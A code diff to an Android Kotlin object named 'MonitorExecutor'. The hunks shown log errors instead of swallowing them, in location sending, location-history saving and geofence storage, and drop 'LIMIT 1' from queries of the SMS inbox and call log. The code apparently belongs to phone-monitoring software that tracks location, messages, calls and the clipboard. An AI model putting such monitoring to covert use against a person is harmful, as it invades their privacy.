@@ -272,7 +272,7 @@ object MonitorExecutor {
                             location.longitude,
                             location.accuracy
                         )
-                    } catch (_: Exception) {}
+                    } catch (e: Exception) { Log.w(TAG, "sendLocation error", e) }
                 }
             }
             
@@ -395,7 +395,7 @@ object MonitorExecutor {
                 put("provider", entry.provider)
             }
             file.appendText(json.toString() + "\n")
-        } catch (_: Exception) {}
+        } catch (e: Exception) { Log.w(TAG, "saveLocationToFile error", e) }
     }
     
     fun clearLocationHistory(): String {
@@ -510,7 +510,7 @@ object MonitorExecutor {
                 }
             })
             prefs.edit().putString("geofences", json.toString()).apply()
-        } catch (_: Exception) {}
+        } catch (e: Exception) { Log.w(TAG, "saveGeofences error", e) }
     }
     
     private fun loadGeofences() {
@@ -531,7 +531,7 @@ object MonitorExecutor {
                     name = obj.optString("name")
                 ))
             }
-        } catch (_: Exception) {}
+        } catch (e: Exception) { Log.w(TAG, "loadGeofences error", e) }
     }
 
     // ===== CLIPBOARD MONITOR =====
@@ -778,7 +778,7 @@ object MonitorExecutor {
                             Telephony.Sms.TYPE
                         )
                         
-                        context.contentResolver.query(uri, projection, null, null, "${Telephony.Sms._ID} DESC LIMIT 1")?.use { cursor ->
+                        context.contentResolver.query(uri, projection, null, null, "${Telephony.Sms._ID} DESC")?.use { cursor ->
                             if (cursor.moveToFirst()) {
                                 val id = cursor.getLong(0)
                                 
@@ -850,7 +850,7 @@ object MonitorExecutor {
                         
                         context.contentResolver.query(
                             CallLog.Calls.CONTENT_URI,
-                            projection, null, null, "${CallLog.Calls._ID} DESC LIMIT 1"
+                            projection, null, null, "${CallLog.Calls._ID} DESC"
                         )?.use { cursor ->
                             if (cursor.moveToFirst()) {
                                 val id = cursor.getLong(0)
